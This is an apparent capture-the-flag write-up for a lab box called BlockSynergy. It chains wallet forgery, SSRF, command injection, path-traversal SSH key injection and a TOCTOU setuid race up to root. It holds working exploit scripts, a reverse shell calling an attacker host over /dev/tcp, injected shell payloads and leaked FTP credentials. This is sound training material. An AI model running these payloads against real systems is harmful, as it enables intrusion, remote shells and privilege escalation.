---

## Overview

BlockSynergy is a Flask-based blockchain wallet dashboard on port 8080, with a
second, internal-only "Smart Contract Development Server" Flask instance on
`127.0.0.1:5000`. The chain goes: unauthenticated wallet forgery → VIP access
→ SSRF into an internal admin panel → command injection → user flag → a
path-traversal file-write bug in the internal contract engine → SSH key
injection → hank shell → a TOCTOU race against a root-owned backup/restore
daemon → root.

---

## Part 1 — User: walter

### 1. Recon — public blockchain balances

`/blockchain` returns the full chain as JSON. Every block's `data` list
contains transactions with `sender`/`receiver`/`amount`. Summing these per
address (skipping subtraction when `sender == "Blockchain_Reward"`) gives the
running balance of every address that has ever appeared on-chain — including
addresses whose owners are long gone.

```python
import json
from collections import defaultdict

chain = json.load(open("chain.json"))
balances = defaultdict(int)
for block in chain:
    for tx in block.get("data", []):
        if not isinstance(tx, dict) or "amount" not in tx:
            continue
        amt = int(tx["amount"])
        if tx.get("receiver"):
            balances[tx["receiver"]] += amt
        if tx.get("sender") and tx["sender"] != "Blockchain_Reward":
            balances[tx["sender"]] -= amt

vip_public, vip_balance = max(balances.items(), key=lambda kv: kv[1])
```

### 2. Wallet forgery — mismatched keypair accepted

`/dashboard/wallet` (`action=create`) hands out a legitimate, freshly
generated `{private_key, public_key}` pair. `/dashboard/wallet`
(`action=load`) accepts an uploaded wallet JSON and never verifies that the
supplied `private_key` actually derives the supplied `public_key`
(`Wallet.load_wallet()` in `Blockchain.py` just trusts both fields
independently). This means you can Frankenstein a wallet: your own fresh
`private_key` + someone else's high-balance `public_key`.

```python
forged_wallet = {
    "private_key": fresh_wallet["private_key"],   # your own, legit
    "public_key": vip_public,                     # richest historical address
}
r = s.post(f"{BASE}/dashboard/wallet", data={"action": "load"},
           files={"file": ("forged_wallet.json", json.dumps(forged_wallet), "application/json")})
```

Once loaded, `/dashboard/info` reports the forged wallet's balance as the
target address's balance — sufficient to clear the `balance >= 10` VIP gate
guarding `/dashboard/vip/nodes` and `/dashboard/vip/smart_contracts`.

### 3. SSRF via `0.0.0.0` bypass

`/dashboard/vip/nodes` (`action=register`) lets a VIP-balance session
register arbitrary "node" URLs, later fetched server-side by
`/dashboard/vip/nodes/test_node/<id>`. The filter meant to block internal
targets:

```python
def is_internal_address(url):
    try:
        parsed = urlparse(url)
        host = parsed.hostname
        ip = socket.gethostbyname(host)
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_loopback
    except Exception as e:
        flash(f"Error in is_internal_address: {e}", 'error')
        return True
```

does a DNS-style resolve-then-check. `0.0.0.0` needs no resolution and the
kernel still routes it to loopback on connect, slipping past the check while
still reaching admin-only, localhost-restricted routes
(`is_admin()` just checks `request.remote_addr == "127.0.0.1"`).

```bash
curl -b "session=$SESSION" -X POST http://TARGET:8080/dashboard/vip/nodes \
  --data-urlencode "action=register" --data-urlencode "node=http://0.0.0.0:8080/admin"
```

Registering, then hitting `test_node/<id>` for that entry, returns the
internal `/admin` dashboard — confirming the SSRF.

### 4. RCE — command injection via `ping_node`

`/admin/nodes/manage` (`action=ping_node`) does:

```python
ip = extract_ip_from_url(target)
output = subprocess.check_output(f"ping -w 4{ip}", shell=True, ...)
```

`shell=True` with unsanitized string interpolation. `extract_ip_from_url`
naively strips `http(s)://` and splits on `/`/`:`, so anything after the
first `/` or `:` after the scheme survives into the shell command. A second
SSRF hop is required since `/admin/*` only accepts connections from
`127.0.0.1` — you can't call it directly, but the app's own SSRF-vulnerable
`test_node` can, on your behalf.

```python
command = 'id'
encoded = base64.b64encode(command.encode()).decode()
command_node = "http://foo&echo$IFS''" + encoded + "|base64$IFS''-d|bash&@" + VPN_IP + ":4444/"
```

- `$IFS''` substitutes for a blocked space character.
- Base64 avoids shell-breaking characters while transiting a URL string.
- The whole thing is registered as a VIP node, then a second node —
`http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=<command_node>`
— is registered and `test_node`'d, causing the app to SSRF into its own
admin panel and trigger the injection.

Sanity-checked with `id`, then escalated to a full reverse shell:

```
bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1
```

```python
#script
#!/usr/bin/env python3
import base64
import html
import re
import requests

BASE = "http://IP:8080"
SESSION_COOKIE = "SESSION_COOKIE"

s = requests.Session()
s.cookies.set("session", SESSION_COOKIE)

VPN_IP = "IP"

def register_node(url):
    r = s.post(f"{BASE}/dashboard/vip/nodes",
                data={"action": "register", "node": url}, timeout=15)
    r.raise_for_status()

def find_node_id(url):
    page = s.get(f"{BASE}/dashboard/vip/nodes", timeout=15).text
    pairs = re.findall(r'title="([^"]+)".*?testNode\(\'(\d+)\'\)', page, re.S)
    pairs = [(html.unescape(v), nid) for v, nid in pairs]
    return next(nid for v, nid in reversed(pairs) if v == url)

def test_node(url):
    node_id = find_node_id(url)
    r = s.get(f"{BASE}/dashboard/vip/nodes/test_node/{node_id}", timeout=25)
    r.raise_for_status()
    return r.text

def run(command):
    """Run `command` on the box via the two-hop SSRF and return any inline <pre> output."""
    encoded = base64.b64encode(command.encode()).decode()
    command_node = "http://foo&echo$IFS''" + encoded + "|base64$IFS''-d|bash&@" + VPN_IP + ":4444/"

    register_node(command_node)

    from urllib.parse import urlencode
    internal_action = "http://0.0.0.0:8080/admin/nodes/manage?" + urlencode(
        {"action": "ping_node", "target": command_node}
    )
    register_node(internal_action)

    resp = test_node(internal_action)
    outputs = [html.unescape(v).strip() for v in re.findall(r"<pre[^>]*>(.*?)</pre>", resp, re.S) if v.strip()]
    return "\n".join(outputs) if outputs else resp

if __name__ == "__main__":
    print("--- sanity check ---")
    print(run("bash -i >& /dev/tcp/IP/4444 0>&1"))

```

Landed as `walter` (uid=1000). `user.txt` read directly:
`34015656a6edfcaa91fca2347ddfcb40`.

**User-flag chain summary:**

```
public blockchain -> historical public key credited with 99 coins
  -> inconsistent private/public wallet accepted
  -> VIP Node Management access -> SSRF via 0.0.0.0 to /admin
  -> ping_node with shell=True -> command injection as walter
  -> read /home/walter/user.txt
```

---

## Part 2 — hank: path traversal in the ContractEngine debug hook

### 5. Internal :5000 discovery

`app.py`'s `/dashboard/vip/smart_contracts` route only renders a template —
the actual contract logic lives in a **separate** internal-only Flask app,
reachable at `127.0.0.1:5000` from inside the box, backed by
`/opt/staging/smart_contracts/contract.py`, `dev_app.py`, etc. (all
`hank:developers`, mode `775` — world-readable, so `cat`-able directly as
walter).

### 6. The vulnerable hook

```python
# contract.py — ContractEngine.run_hook()
if self.debug == "True":
    if hook_val == "log":
        content = self.contract.get("__meta__", {}).get("log_content", "").get(hook_name, "")
        file = self.contract.get("__meta__", {}).get("log_file", "")
        timestamp = datetime.datetime.now().isoformat()
        logfile = f"/opt/staging/smart_contracts/logs/{file}"
        with open(logfile, "a") as f:
            f.write(f"[{timestamp}] [{hook_name}] {content}\n")

    elif hook_val == "backup":
        file = self.contract.get("__meta__", {}).get("backup_filename", "")
        with open(f"/opt/staging/smart_contracts/logs/{file}", "w") as f:
            json.dump(self.storage, f, indent=4)
```

`file`/`log_file` come directly from attacker-controlled JSON and are
f-string concatenated into `open()` with **no path sanitization** — arbitrary
file read/write via `../` traversal, gated only on:

- `contract_data["debug"] == "True"` (string, not boolean),
- `hooks.<action> == "log"` or `"backup"`,
- `is_allowed(action, sender)` returning `True` for that action (trivially
satisfied with `"logic": {"mint": "allow"}`).

**Real bug encountered along the way:** `mint()` does
`self.storage["total_supply"] += amount` unconditionally — if `total_supply`
isn't pre-seeded in `storage`, this throws `KeyError`, is silently swallowed
by the surrounding `try/except`, and **`run_hook()` never executes**. Fix:
seed `"total_supply": 0` in `storage`.

**Format bug also worth noting:** the `"log"` hook always prepends
`[timestamp] [hook_name]`  to the written line, which corrupts a single-line
`authorized_keys` entry. Embedding a literal `\n` inside `log_content` pushes
the actual key onto its own clean line, which sshd parses fine despite the
garbage line above it.

### 7. Payload

```json
{
  "name": "x", "id": "1", "owner": "attacker",
  "logic": {"mint": "allow"},
  "storage": {"balances": {}, "total_supply": 0},
  "debug": "True",
  "hooks": {"on_mint": "log"},
  "__meta__": {
    "log_file": "../../../../home/hank/.ssh/authorized_keys",
    "log_content": {"on_mint": "\n<attacker_ssh_pubkey>\n"}
  }
}
```

```bash
ssh-keygen -t ed25519 -f ./hank_key -N ""
PUBKEY=$(cat hank_key.pub)

cat > payload2.json << EOF
{
  "name": "x",
  "id": "1",
  "owner": "attacker",
  "logic": {"mint": "allow"},
  "storage": {"balances": {}, "total_supply": 0},
  "debug": "True",
  "hooks": {"on_mint": "log"},
  "__meta__": {
    "log_file": "../../../../home/hank/.ssh/authorized_keys",
    "log_content": {"on_mint": "\n$PUBKEY\n"}
  }
}
EOF

curl -s -c cj.txt -b cj.txt -X POST http://127.0.0.1:5000/dashboard \
  -F "action=upload_contract" \
  -F "contract_file=@payload2.json;filename=payload2.json;type=application/json" > /dev/null

curl -s -c cj.txt -b cj.txt -X POST http://127.0.0.1:5000/dashboard \
  -F "action=contract_mint" -F "contract_mint_amount=1" | grep -i "toast-body\|error"
```

(A shared cookie jar across both calls is required — the "currently loaded
contract" is tracked per Flask session.)

```bash
ssh -i hank_key hank@IP
```

→ shell as `hank` (uid=1001).

---

## Part 3 — root: TOCTOU race on the backup/restore daemon

### 8. Recon as hank

`/etc/crontab`:

```
*/5 * * * *	root /opt/backup/backup.sh
```

`/opt/backup` is `root:sysadmins` (0770) — unreadable directly by hank.
`pspy64` run as hank while waiting for the `*/5` cycle reveals:

```
CMD: UID=0 | /usr/bin/curl -T /tmp/_opt_staging.tar.gz ftp://ftpuser:KTkJSAjuDjSOocAYLgYa@127.0.0.1:15432/upload/_opt_staging.tar.gz
```

FTP credentials leaked in the command line of a root-run job.

### 9. Restore daemon

`touch /opt/blocksynergy/restore` (directory is `hank:developers`,
group-writable) triggers a root-run restore daemon: it FTP-downloads the
backup into `/var/restore_work/` (`root:developers`, group-writable — hank
can write here), verifies its SHA-256 against a manifest, then runs
`tar xvf ... -C /`.

Swapping the tar too early (before download/checksum) causes
`/var/log/restore.log` to show `Checksum mismatch! Restore aborted.` The
checksum is verified against the **FTP-side** copy, so the win condition is
swapping the **local downloaded copy** in `/var/restore_work/`, after the
checksum step but before the `tar xvf` extraction fires on the daemon's
~10-second poll cycle — a classic TOCTOU window.

# ROOT flag

Prereq: you already have a `hank` shell (via the `:5000` ContractEngine debug-hook file-write → SSH key into `/home/hank/.ssh/authorized_keys`). Root is a TOCTOU race on the restore daemon.

## 1. The catch — checksum

`/var/log/restore.log` shows `Checksum mismatch! Restore aborted.` if you just swap the tar naively. The daemon verifies the SHA-256 of the FTP file **before** download completes locally, so swapping too early = mismatch. The win is to swap the downloaded copy in `/var/restore_work/` — after the download finishes, before the `tar x` runs (extract fires on the daemon's ~10s poll cycle).

## 2. Build the malicious archive (setuid bash planted as `.hchk`)

```bash
tar --owner=0 --group=0 --mode=4755 \
  --transform='s|^bash$|opt/blocksynergy/.hchk|' \
  -czf /home/hank/suid.tar.gz -C /bin bash
```

## 3. Win the race — `toctou.sh` swaps the restore_work archive the moment the download finishes, atomically with `mv -fT`

```bash
cat > /home/hank/toctou.sh <<'EOF'
#!/bin/bash
F=/var/restore_work/_opt_staging.tar.gz
END=$((SECONDS + 50))
SWAPPED=0
while [ $SECONDS -lt $END ]; do
  if [ -f "$F" ] && [ $SWAPPED -eq 0 ]; then
    SZ=$(stat -c%s "$F" 2>/dev/null)
    if [ -n "$SZ" ] && [ "$SZ" -gt 10000000 ]; then
      cp /home/hank/suid.tar.gz /var/restore_work/.swp 2>/dev/null
      mv -fT /var/restore_work/.swp "$F" 2>/dev/null && { echo "[+] SWAPPED"; SWAPPED=1; }
    fi
  fi
  [ -f /opt/blocksynergy/.hchk ] && { echo "[+] .hchk LANDED"; exit 0; }
done
EOF
chmod +x /home/hank/toctou.sh

/home/hank/toctou.sh &
sleep 1
touch /opt/blocksynergy/restore
wait
```

Key details:

- One atomic swap (`cp` to a temp file + `mv -fT`), not a busy-loop `cp` — a continuous overwrite corrupts the archive mid-read (gzip/tar error).
- The swap is gated on file size `>10MB`, which only becomes true once the FTP download has actually completed — landing squarely in the gap between the daemon's checksum step and its extraction step.
- Unlimited retries: the daemon re-downloads every cycle if the race is missed, no cleanup required between attempts.

## 4. Root

```
hank@blocksynergy:~$ ls -la /opt/blocksynergy/.hchk
-rwsr-xr-x 1 root root 1446024 /opt/blocksynergy/.hchk
hank@blocksynergy:~$ /opt/blocksynergy/.hchk -p
.hchk-5.2# id
uid=1001(hank) gid=1003(hank) euid=0(root) groups=1003(hank),1001(developers)
.hchk-5.2# cat /root/root.txt
```

## Root chain summary

```
hank shell
  -> pspy leaks root cron FTP creds (ftpuser @ 127.0.0.1:15432)
  -> touch /opt/blocksynergy/restore triggers root restore daemon
  -> daemon: FTP download -> /var/restore_work/ -> checksum (verified pre-download) -> tar xvf -C /
  -> TOCTOU: atomically swap downloaded tar with setuid-bash tar post-download, pre-extraction
  -> /opt/blocksynergy/.hchk (root, 4755)
  -> .hchk -p -> root shell -> /root/root.txt
```

## Full chain, end to end

```
Unauthenticated
  -> Wallet Creation & Coin Forging (public-key/private-key mismatch accepted)
  -> SSRF via 0.0.0.0 bypass (naive resolve-based internal-address filter)
  -> RCE via shell=True command injection in ping_node
  -> walter shell (uid=1000) -> user.txt
  -> Internal :5000 Flask app discovery (world-readable app source)
  -> Path traversal file-write in ContractEngine debug hook
  -> SSH key injection to hank's authorized_keys
  -> hank shell (uid=1001)
  -> pspy64 leaks root cron FTP credentials
  -> TOCTOU race against root backup/restore daemon
  -> setuid bash planted as /opt/blocksynergy/.hchk
  -> root shell -> root.txt
```

## Notes / dead ends

- A `mike` → `sysadmins` → `backup.sh` path was discussed as a possible route but turned out to be a rabbit hole for root — the tar race goes directly from hank to root, no `mike` foothold required.
- The archive filename on the FTP upload/restore path is confirmed `_opt_staging.tar.gz` on this instance (verify per-box before reusing this writeup, as generic community notes reference `_opt_blocksynergy.tar.gz` instead).
- Root cause of early debugging pain: an earlier draft of the race script pointed at the wrong tar filename and exited instantly rather than actually losing the race — always confirm the exact filename via `pspy64 -f` on the live FTP `curl -T` line before building the racer.
